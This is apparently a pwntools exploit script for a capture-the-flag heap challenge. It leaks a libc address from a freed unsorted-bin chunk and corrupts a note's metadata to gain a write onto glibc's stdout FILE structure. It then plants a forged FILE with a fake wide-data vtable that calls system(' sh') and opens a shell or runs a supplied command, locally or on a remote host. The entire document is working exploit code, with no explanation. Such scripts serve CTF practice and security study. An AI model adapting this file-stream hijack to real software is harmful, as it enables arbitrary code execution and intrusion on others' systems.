#!/usr/bin/env python3
from pwn import *
from struct import pack_into

context.binary = elf = ELF("./chal", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

MAGIC = 0x1337133713371337
UNSORTED_LEAK_OFF = 0x1E9B20


def start():
    if args.REMOTE:
        return remote(args.HOST, int(args.PORT))
    return process(["./ld-linux-x86-64.so.2", "--library-path", ".", "./chal"])


def menu(p, choice):
    p.sendlineafter(b"> ", str(choice).encode())


def add(p, idx, size, title=b"T" * 8):
    menu(p, 1)
    p.sendlineafter(b"idx?\n", str(idx).encode())
    p.sendlineafter(b"size?\n", str(size).encode())
    p.sendafter(b"title?\n", title)
    p.recvuntil(b"ok\n")


def edit(p, idx, data, wait=True):
    menu(p, 2)
    p.sendlineafter(b"idx?\n", str(idx).encode())
    p.sendafter(b"data?\n", data)
    if wait:
        p.recvuntil(b"ok\n")


def show(p, idx, n):
    menu(p, 3)
    p.sendlineafter(b"idx?\n", str(idx).encode())
    return p.recvn(n)


def delete(p, idx):
    menu(p, 4)
    p.sendlineafter(b"idx?\n", str(idx).encode())
    p.recvuntil(b"ok\n")


def build_stdout_fsop(stdout_addr):
    fake_wide = stdout_addr + 0x100
    fake_vtable = stdout_addr + 0x220
    fake_lock = stdout_addr + 0x320

    payload = bytearray(0x400)

    def qword(off, val):
        pack_into("<Q", payload, off, val)

    payload[0:8] = b" sh\x00\x00\x00\x00\x00"
    qword(0x88, fake_lock)
    qword(0xA0, fake_wide)
    qword(0xC0, 1)
    qword(0xD8, libc.sym._IO_wfile_jumps)

    wide_off = fake_wide - stdout_addr
    qword(wide_off + 0x18, 0)
    qword(wide_off + 0x20, 1)
    qword(wide_off + 0xE0, fake_vtable)

    vtable_off = fake_vtable - stdout_addr
    qword(vtable_off + 0x68, libc.sym.system)
    return bytes(payload)


p = start()

add(p, 0, 0x500)
add(p, 1, 0x20)
delete(p, 0)
add(p, 2, 0x500)
libc.address = u64(show(p, 2, 8)) - UNSORTED_LEAK_OFF
log.info(f"libc = {libc.address:#x}")

add(p, 3, 0x20)
delete(p, 3)
add(p, 4, 0x20)
edit(p, 4, flat(MAGIC, 0x400, libc.sym._IO_2_1_stdout_, b"A" * 8))

edit(p, 3, build_stdout_fsop(libc.sym._IO_2_1_stdout_), wait=False)
p.sendline(b"5")
if args.CMD:
    p.sendline(args.CMD.encode())
    print(p.recvall(timeout=5).decode("latin-1", errors="replace"), end="")
else:
    p.interactive()
